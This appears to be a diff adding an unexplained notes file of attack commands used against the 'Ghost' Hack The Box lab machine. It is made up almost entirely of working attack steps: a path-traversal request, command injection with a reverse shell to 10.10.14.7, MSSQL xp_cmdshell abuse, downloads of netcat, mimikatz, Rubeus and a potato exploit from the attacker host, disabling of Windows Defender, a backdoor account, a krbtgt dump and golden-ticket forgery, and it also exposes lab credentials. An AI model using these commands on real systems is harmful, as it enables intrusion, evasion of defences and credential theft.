@@ -1,0 +1,127 @@
+http://ghost.htb:8008/ghost/
+http://ghost.htb:8008/ghost/api/content/...38c83aaca6
+
+http://intranet.ghost.htb:8008/news - * and *
+
+http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../proc/self/environ&key=37395e9e872be56438c83aaca6
+
+
+curl -X POST http://intranet.ghost.htb:8008/api-dev/scan \
+  -H "Content-Type: application/json" \
+  -H "DEV_INTRANET_KEY: !@yqr!X2kxmQ.@Xe" \
+  -d '{"url":sh -i >& /dev/tcp/10.10.14.7/4444 0>&1"}'
+
+
+curl -X POST http://intranet.ghost.htb:8008/api-dev/scan \
+  -H 'Content-Type: application/json' \
+  -H ' DEV_INTRANET_KEY: !@yqr!X2kxmQ.@Xe' \
+  -d '{"url": "sh -i >& /dev/tcp/10.10.14.7/4444 0>&1"}'
+
+
+
+florence.ramirez@ghost.htb
+uxLmt*udNc6t3HrF
+
+
+
+SQL (GHOST\florence.ramirez  guest@master)> use_link [primary]
+SQL >[primary] (bridge_corp  bridge_corp@master)> exec_as_login sa
+SQL >[primary] (sa  dbo@master)> EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+[*] INFO(PRIMARY): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(PRIMARY): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL >[primary] (sa  dbo@master)> xp_cmdshell "powershell /c whoami"
+
+use_link [primary]
+exec_as_login sa
+EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE
+xp_cmdshell "powershell /c c:\windows\temp\nc.exe 10.10.14.7 1234 -e cmd.exe"
+output
+----------------------
+nt service\mssqlserver
+
+
+SQL >[primary] (sa  dbo@master)>
+SQL >[primary] (sa  dbo@master)> xp_cmdshell "powershell /c curl http://10.10.14.7/test"
+
+SQL >[primary] (sa  dbo@master)> xp_cmdshell "powershell /c curl http://10.10.14.7/nc.exe -o c:\windows\temp\nc.exe"
+
+
+SQL >[primary] (sa  dbo@master)> xp_cmdshell "powershell /c c:\windows\temp\nc.exe 10.10.14.7 1234 -e cmd.exe"
+
+powershell /c Invoke-WebRequest -Uri http://10.10.14.7/PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsin
+
+
+
+powershell /c Invoke-WebRequest -Uri http://10.10.14.7/EfsPotato.cs -OutFile EfsPotato.cs -UseBasicParsing
+C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
+
+powershell /c Invoke-WebRequest -Uri http://10.10.14.7/PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing
+EfsPotato.exe "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+ C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Temp\EfsPotato.exe "Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1""
+
+
+EfsPotato.exe "powershell Set-MpPreference -ExclusionPath C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Temp\PowerView.ps1"
+ powershell /c C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Temp\PowerView.ps1
+
+
+
+
+EfsPotato.exe "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+
+powershell /c Invoke-WebRequest -Uri http://10.10.14.7/nc.exe -OutFile nc.exe -UseBasicParsing
+ C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Temp\EfsPotato.exe "nc.exe -nv 10.10.14.7 4456 -e cmd.exe"
+
+powershell /c Invoke-WebRequest -Uri http://10.10.14.7/expl.exe -OutFile expl.exe -UseBasicParsing
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+powershell /c Invoke-WebRequest -Uri http://10.10.14.7/mimikatz.exe -OutFile mimikatz.exe -UseBasicParsing
+C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Temp\\mimikatz.exe
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+Domain : GHOST-CORP / S-1-5-21-2034262909-2733679486-179904498
+
+kerberos::golden /user:Administrator /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:dae1ad83e2af14a379017f244a2f5297 /service:krbtgt /target:GHOST.HTB /ticket:golden.kirbi
+
+.\Rubeus.exe asktgs /ticket:golden.kirbi /dc:dc01.ghost.htb /service:CIFS/dc01.ghost.htb /nowrap /ptt /impersonateuser:Administrator
+
+dir \\DC01.ghost.htb\C$
+
+cd \\DC01.ghost.htb\C$
+dir \\DC01.ghost.htb\C$\Users
+
+type \\DC01.ghost.htb\C$\Users\justin.bradley\desktop\user.txt
+type \\DC01.ghost.htb\C$\Users\Administrator\desktop\root.txt
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+powershell /c Invoke-WebRequest -Uri http://10.10.14.7/Rubeus.exe -OutFile Rubeus.exe -UseBasicParsing
+
+
+EfsPotato.exe "powershell Set-MpPreference -ExclusionPath C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Temp\mimikatz.exe"
+EfsPotato.exe "powershell Set-MpPreference -ExclusionPath C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Temp\kali.exe"
+
+EfsPotato.exe "powershell Set-MpPreference -ExclusionPath "C:\Users\Administrator\AppData\Local\Temp\powerview.ps1"
+
+
+
+./EfsPotato.exe "powershell -noexit C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Temp\PowerView.ps1"
+
+
+\mimikatz.exe
+
+
+ ./EfsPotato.exe "net user carrot Pass@@word /add"
+
+
+
+
+QL (GHOST\florence.ramirez  guest@master)> EXEC sp_linkedservers
+SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
+--------   ----------------   -----------   --------------   ------------------   ------------   -------   
+DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      
+
+PRIMARY    SQLNCLI            SQL Server    PRIMARY          NULL                 NULL           NULL     
